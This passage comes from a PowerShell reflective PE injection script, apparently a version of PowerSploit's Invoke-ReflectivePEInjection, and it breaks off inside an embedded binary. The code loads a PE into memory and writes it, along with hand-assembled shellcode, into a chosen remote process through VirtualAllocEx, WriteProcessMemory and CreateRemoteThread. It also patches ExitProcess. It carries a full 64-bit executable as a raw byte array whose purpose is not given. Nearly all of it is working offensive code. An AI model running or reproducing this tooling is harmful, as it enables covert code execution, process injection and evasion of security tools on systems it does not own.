        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }   
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        [Byte[]]$PEBytes = [byte[]] (77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,248,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0,6,191,181,21,66,222,219,70,66,222,219,70,66,222,219,70,75,166,72,70,80,222,219,70,16,171,218,71,64,222,219,70,16,171,222,71,85,222,219,70,16,171,223,71,72,222,219,70,16,171,216,71,65,222,219,70,86,181,218,71,75,222,219,70,66,222,218,70,27,222,219,70,129,171,210,71,70,222,219,70,129,171,36,70,67,222,219,70,129,171,217,71,67,222,219,70,82,105,99,104,66,222,219,70,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,69,0,0,100,134,6,0,166,204,14,100,0,0,0,0,0,0,0,0,240,0,34,0,11,2,14,29,0,42,0,0,0,50,1,0,0,0,0,0,136,45,0,0,0,16,0,0,0,0,0,64,1,0,0,0,0,16,0,0,0,2,0,0,6,0,0,0,0,0,0,0,6,0,0,0,0,0,0,0,0,160,1,0,0,4,0,0,0,0,0,0,3,0,96,129,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,132,84,0,0,44,1,0,0,0,128,1,0,224,1,0,0,0,112,1,0,196,2,0,0,0,0,0,0,0,0,0,0,0,144,1,0,84,0,0,0,136,73,0,0,112,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,74,0,0,56,1,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,116,101,120,116,0,0,0,220,40,0,0,0,16,0,0,0,42,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,96,46,114,100,97,116,97,0,0,206,31,0,0,0,64,0,0,0,32,0,0,0,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,64,46,100,97,116,97,0,0,0,64,8,1,0,0,96,0,0,0,4,0,0,0,78,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,192,46,112,100,97,116,97,0,0,196,2,0,0,0,112,1,0,0,4,0,0,0,82,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,64,46,114,115,114,99,0,0,0,224,1,0,0,0,128,1,0,0,2,0,0,0,86,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,64,46,114,101,108,111,99,0,0,84,0,0,0,0,144,1,0,0,2,0,0,0,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,72,137,92,36,8,87,72,131,236,96,72,139,5,247,79,0,0,72,51,196,72,137,68,36,80,69,51,201,68,137,68,36,64,139,250,72,199,68,36,48,0,0,0,0,199,68,36,40,128,0,0,0,72,141,13,197,80,0,0,186,0,0,0,192,199,68,36,32,3,0,0,0,69,141,65,7,255,21,198,47,0,0,69,51,201,69,51,192,72,139,200,139,215,72,139,216,255,21,170,47,0,0,76,141,76,36,72,72,199,68,36,32,0,0,0,0,65,184,4,0,0,0,72,141,84,36,64,72,139,203,255,21,128,47,0,0,72,139,203,255,21,143,47,0,0,72,139,76,36,80,72,51,204,232,178,24,0,0,72,139,92,36,112,72,131,196,96,95,195,204,204,204,204,204,204,204,72,137,92,36,8,85,86,87,72,131,236,80,72,139,5,69,79,0,0,72,51,196,72,137,68,36,72,69,51,201,72,199,68,36,48,0,0,0,0,65,139,248,199,68,36,40,128,0,0,0,139,234,199,68,36,32,3,0,0,0,186,0,0,0,192,72,141,13,8,80,0,0,69,141,65,7,255,21,22,47,0,0,69,51,201,69,51,192,72,139,200,139,213,72,139,216,255,21,250,46,0,0,72,141,53,243,86,0,0,72,199,68,36,32,0,0,0,0,72,139,214,76,141,76,36,64,68,139,199,72,139,203,255,21,198,46,0,0,72,139,203,255,21,221,46,0,0,199,5,207,86,0,0,0,0,0,0,65,184,255,255,255,255,133,255,116,38,72,141,21,226,50,0,0,102,144,15,182,14,72,141,118,1,65,139,192,65,193,232,8,72,51,200,15,182,193,68,51,4,130,131,199,255,117,227,65,247,208,141,85,12,232,120,254,255,255,72,139,76,36,72,72,51,204,232,187,23,0,0,72,139,92,36,112,72,131,196,80,95,94,93,195,204,204,204,204,204,204,204,204,204,204,204,204,204,204,72,141,5,113,86,1,0,195,204,204,204,204,204,204,204,204,72,137,76,36,8,72,137,84,36,16,76,137,68,36,24,76,137,76,36,32,83,86,87,72,131,236,48,72,139,249,72,141,116,36,88,185,1,0,0,0,255,21,130,48,0,0,72,139,216,232,186,255,255,255,69,51,201,72,137,116,36,32,76,139,199,72,139,211,72,139,8,255,21,91,48,0,0,72,131,196,48,95,94,91,195,204,204,204,204,204,204,204,204,204,204,204,72,137,92,36,8,72,137,116,36,16,87,72,131,236,32,139,241,73,139,216,72,139,13,53,79,0,0,72,131,249,255,15,132,5,1,0,0,68,141,70,2,186,8,0,0,0,65,193,224,4,255,21,96,46,0,0,72,139,248,72,133,192,15,132,230,0,0,0,72,139,13,5,79,0,0,72,131,249,255,15,132,213,0,0,0,186,8,0,0,0,65,184,161,0,0,0,255,21,50,46,0,0,72,133,192,15,132,187,0,0,0,15,16,3,15,17,0,15,16,75,16,15,17,72,16,15,16,67,32,15,17,64,32,15,16,75,48,15,17,72,48,15,16,67,64,15,17,64,64,15,16,75,80,15,17,72,80,15,16,67,96,15,17,64,96,15,16,67,112,15,17,64,112,15,16,139,128,0,0,0,15,17,136,128,0,0,0,15,16,131,144,0,0,0,51,219,15,17,128,144,0,0,0,198,128,160,0,0,0,0,199,71,4,96,0,0,0,137,55,72,137,71,8,133,246,116,52,15,31,64,0,102,15,31,132,0,0,0,0,0,68,139,79,4,69,51,192,139,203,72,255,193,72,193,225,4,72,3,207,72,141,81,8,255,21,3,45,0,0,133,192,116,25,255,195,59,31,114,217,72,139,92,36,48,72,139,199,72,139,116,36,56,72,131,196,32,95,195,185,1,0,0,0,255,21,211,46,0,0,204,204,204,204,204,204,204,204,204,204,204,72,137,92,36,16,72,137,116,36,24,87,72,131,236,64,72,139,5,146,76,0,0,72,51,196,72,137,68,36,56,51,246,72,139,249,139,222,57,25,118,55,15,31,128,0,0,0,0,68,139,71,4,76,141,76,36,48,72,139,87,8,139,203,72,3,201,137,116,36,48,72,137,116,36,32,72,139,76,207,24,255,21,82,44,0,0,133,192,116,35,255,195,59,31,114,208,72,139,76,36,56,72,51,204,232,131,21,0,0,72,139,92,36,88,72,139,116,36,96,72,131,196,64,95,195,185,1,0,0,0,255,21,64,46,0,0,204,204,204,204,204,204,204,204,64,86,87,65,87,72,131,236,48,72,139,5,8,76,0,0,72,51,196,72,137,68,36,40,76,139,249,72,137,108,36,96,185,32,0,0,0,255,21,117,45,0,0,76,139,21,238,83,1,0,76,141,76,36,32,51,246,72,139,208,72,139,232,137,116,36,32,68,141,70,32,141,78,11,65,255,82,8,61,4,0,0,192,117,48,72,139,205,255,21,50,45,0,0,139,76,36,32,255,21,56,45,0,0,68,139,68,36,32,76,141,76,36,32,72,139,232,141,78,11,72,139,208,72,139,5,158,83,1,0,255,80,8,72,137,92,36,88,72,133,237,116,83,76,137,116,36,104,72,141,93,48,139,254,102,15,31,68,0,0,76,139,115,232,72,141,21,189,51,0,0,72,139,203,255,21,236,45,0,0,133,192,116,25,255,199,72,129,195,40,1,0,0,131,255,10,114,218,72,139,205,255,21,193,44,0,0,235,12,72,139,205,255,21,182,44,0,0,73,139,246,76,139,116,36,104,51,210,72,141,13,165,51,0,0,68,141,66,1,255,21,187,43,0,0,72,139,108,36,96,72,139,248,72,133,192,116,31,73,139,215,72,139,207,255,21,130,43,0,0,72,43,247,72,139,207,72,141,28,6,255,21,138,43,0,0,72,139,195,72,139,92,36,88,72,139,76,36,40,72,51,204,232,45,20,0,0,72,131,196,48,65,95,95,94,195,204,204,204,204,72,137,92,36,8,72,137,116,36,16,87,72,131,236,48,72,139,5,194,74,0,0,72,51,196,72,137,68,36,40,72,139,13,27,76,0,0,51,255,137,124,36,32,73,139,240,72,131,249,255,15,132,168,0,0,0,141,87,8,68,141,71,48,255,21,67,43,0,0,72,139,216,72,133,192,15,132,143,0,0,0,72,139,208,76,141,76,36,32,72,139,5,128,82,1,0,68,141,71,48,141,79,66,255,80,8,72,139,5,207,75,0,0,72,131,248,255,116,105,102,15,31,132,0,0,0,0,0,76,139,195,51,210,72,139,200,255,21,106,42,0,0,72,139,13,171,75,0,0,72,131,249,255,116,69,68,139,68,36,32,186,8,0,0,0,255,21,221,42,0,0,72,139,216,72,133,192,116,45,68,139,68,36,32,76,141,76,36,32,72,139,208,185,66,0,0,0,72,139,5,20,82,1,0,255,80,8,133,192,116,25,72,139,5,102,75,0,0,72,131,248,255,117,160,185,1,0,0,0,255,21,13,44,0,0,204,76,141,67,8,68,139,207,57,59,118,50,102,15,31,132,0,0,0,0,0,73,129,120,8,0,122,0,0,117,19,65,129,120,16,67,108,102,115,117,9,73,139,8,72,137,12,254,255,199,73,131,192,24,65,255,193,68,59,11,114,215,139,199,72,139,76,36,40,72,51,204,232,232,18,0,0,72,139,92,36,64,72,139,116,36,72,72,131,196,48,95,195,204,204,204,204,204,204,204,204,72,137,92,36,8,72,137,108,36,16,72,137,116,36,24,87,65,86,65,87,72,131,236,48,72,139,13,209,74,0,0,76,139,250,72,131,249,255,15,132,25,1,0,0,186,8,0,0,0,65,184,0,128,0,0,255,21,251,41,0,0,72,139,240,72,133,192,15,132,252,0,0,0,72,139,13,160,74,0,0,72,131,249,255,15,132,235,0,0,0,186,8,0,0,0,65,184,0,128,0,0,255,21,205,41,0,0,72,139,248,72,133,192,15,132,206,0,0,0,51,210,65,184,0,128,0,0,72,139,206,232,66,32,0,0,51,210,65,184,0,128,0,0,72,139,207,232,50,32,0,0,76,139,198,232,17,254,255,255,51,219,72,141,13,16,73,0,0,137,92,36,40,69,51,201,186,0,0,1,192,199,68,36,32,4,0,0,0,139,232,68,141,67,3,255,21,128,43,0,0,76,139,240,72,131,248,255,116,116,76,139,199,232,215,253,255,255,139,200,139,208,43,205,131,249,1,116,109,73,139,206,255,21,179,40,0,0,51,210,65,184,0,128,0,0,72,139,206,232,204,31,0,0,51,210,65,184,0,128,0,0,72,139,207,232,188,31,0,0,76,139,198,232,155,253,255,255,69,51,201,137,92,36,40,186,0,0,1,192,199,68,36,32,4,0,0,0,72,141,13,136,72,0,0,139,232,69,141,65,3,255,21,12,43,0,0,76,139,240,72,131,248,255,117,140,185,1,0,0,0,255,21,88,42,0,0,204,68,139,195,133,210,15,132,152,0,0,0,131,250,4,114,104,131,224,3,68,139,202,68,43,200,72,139,207,72,43,206,72,141,70,16,15,87,219,15,87,210,102,15,31,68,0,0,243,15,111,64,240,65,131,192,4,243,15,111,76,1,240,72,141,64,32,102,15,239,200,102,15,239,217,243,15,111,76,1,224,243,15,111,64,224,102,15,239,200,102,15,239,209,69,59,193,114,205,102,15,239,211,102,15,111,194,102,15,115,216,8,102,15,239,208,102,72,15,126,211,68,59,194,115,38,73,99,192,72,43,254,65,43,208,72,141,12,198,139,194,15,31,0,72,139,20,57,72,51,17,72,141,73,8,72,51,218,72,131,232,1,117,236,72,139,108,36,88,72,139,195,72,139,92,36,80,72,139,116,36,96,77,137,55,72,131,196,48,65,95,65,94,95,195,204,204,204,204,204,204,204,204,204,204,204,204,204,72,129,236,152,0,0,0,72,139,5,90,71,0,0,72,51,196,72,137,68,36,104,185,128,0,0,0,232,176,16,0,0,72,141,13,217,47,0,0,72,137,5,66,79,1,0,255,21,220,39,0,0,72,131,248,255,15,132,47,5,0,0,72,139,13,43,79,1,0,72,141,21,196,47,0,0,72,137,1,72,139,200,255,21,136,39,0,0,72,133,192,15,132,12,5,0,0,72,139,13,8,79,1,0,72,141,21,193,47,0,0,72,137,65,8,72,139,9,255,21,100,39,0,0,72,133,192,15,132,232,4,0,0,72,139,13,228,78,1,0,72,141,21,181,47,0,0,72,137,65,16,72,139,9,255,21,64,39,0,0,72,133,192,15,132,196,4,0,0,72,139,13,192,78,1,0,72,137,156,36,160,0,0,0,72,137,180,36,176,0,0,0,72,137,188,36,144,0,0,0,72,137,65,40,101,72,139,4,37,48,0,0,0,76,137,164,36,136,0,0,0,72,139,72,96,72,139,5,136,78,1,0,72,137,72,88,72,141,112,96,255,21,170,38,0,0,72,139,248,255,21,161,38,0,0,72,139,216,255,21,152,38,0,0,69,51,228,199,68,36,48,2,0,0,0,72,139,200,68,137,100,36,40,76,139,206,68,137,100,36,32,76,139,199,72,139,211,255,21,129,38,0,0,133,192,15,132,50,4,0,0,72,139,53,50,78,1,0,255,21,92,38,0,0,72,139,248,255,21,123,38,0,0,72,139,216,255,21,74,38,0,0,199,68,36,48,2,0,0,0,76,141,78,104,72,139,200,68,137,100,36,40,76,139,199,68,137,100,36,32,72,139,211,255,21,53,38,0,0,133,192,15,132,230,3,0,0,139,29,239,77,1,0,255,21,97,38,0,0,68,139,195,51,210,185,0,4,0,0,139,240,255,21,23,38,0,0,185,20,0,0,0,72,139,248,137,76,36,92,15,31,0,139,209,185,64,0,0,0,255,21,19,38,0,0,76,139,21,172,77,1,0,76,141,76,36,92,68,139,68,36,92,72,139,208,185,64,0,0,0,72,139,216,65,255,82,8,61,4,0,0,192,117,6,139,76,36,92,235,198,133,192,15,133,107,3,0,0,76,139,3,77,133,192,15,132,95,3,0,0,72,137,172,36,168,0,0,0,72,141,75,32,76,137,172,36,128,0,0,0,65,139,212,76,137,116,36,120,76,137,124,36,112,144,72,57,113,248,117,11,139,199,72,57,1,15,132,229,0,0,0,255,194,72,131,193,40,72,99,194,73,59,192,114,225,73,139,196,72,139,61,39,77,1,0,187,0,16,0,0,72,137,124,36,64,77,139,236,69,139,252,139,243,72,139,111,104,72,137,71,80,15,31,64,0,102,15,31,132,0,0,0,0,0,72,139,214,185,64,0,0,0,255,21,42,37,0,0,76,141,76,36,96,68,139,195,72,139,208,185,64,0,0,0,76,139,240,255,87,8,61,4,0,0,192,116,8,133,192,15,136,190,0,0,0,73,139,206,255,21,60,37,0,0,139,92,36,96,185,64,0,0,0,129,195,0,1,0,0,139,243,139,211,72,137,116,36,80,72,137,92,36,72,255,21,217,36,0,0,76,141,76,36,96,68,139,195,72,139,208,185,64,0,0,0,76,139,240,255,87,8,133,192,120,120,65,139,252,73,57,62,118,107,15,31,64,0,102,102,102,15,31,132,0,0,0,0,0,139,247,72,141,4,182,73,141,28,198,102,131,253,4,117,23,131,123,24,4,235,26,72,99,194,72,141,12,128,72,139,68,203,16,233,27,255,255,255,255,21,195,36,0,0,59,67,24,117,6,72,59,107,32,116,11,255,199,139,199,73,59,6,114,191,235,15,72,141,4,182,65,191,1,0,0,0,77,139,108,198,16,72,139,116,36,80,72,139,92,36,72,72,139,124,36,64,77,133,246,116,9,73,139,206,255,21,121,36,0,0,69,133,255,15,132,248,254,255,255,72,139,5,241,75,1,0,76,139,124,36,112,76,139,116,36,120,72,139,172,36,168,0,0,0,76,137,104,72,76,139,172,36,128,0,0,0,76,57,96,8,15,132,170,1,0,0,184,20,0,0,0,137,68,36,88,139,208,185,64,0,0,0,255,21,19,36,0,0,76,139,21,172,75,1,0,76,141,76,36,88,68,139,68,36,88,72,139,208,185,64,0,0,0,72,139,216,65,255,82,8,61,4,0,0,192,117,6,139,68,36,88,235,198,133,192,15,133,95,1,0,0,72,139,11,72,133,201,15,132,83,1,0,0,139,76,36,88,72,141